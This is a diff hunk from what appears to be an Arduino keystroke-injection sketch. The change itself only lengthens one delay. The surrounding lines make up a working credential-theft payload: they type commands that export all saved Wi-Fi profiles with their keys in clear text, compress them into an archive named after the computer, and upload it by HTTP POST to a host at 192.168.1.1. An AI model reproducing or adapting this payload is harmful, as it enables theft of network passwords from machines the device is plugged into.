@@ -56,7 +56,7 @@ void loop() {
   Keyboard.println("netsh wlan export profile folder=.\\tmp key=clear");
   delay(4500);
   Keyboard.println("Compress-Archive -Path ./tmp -DestinationPath ./tmp/$Env:computername.zip");
-  delay(5000);
+  delay(6500);
   // This requires PowerShell >= 7 in order to work
   Keyboard.println("Invoke-RestMethod -Uri 'http://192.168.1.1/files/' -Method Post -ContentType 'multipart/form-data' -Form @{'upload' = Get-Item \"./tmp/$Env:computername.zip\"}");
   delay(5000);
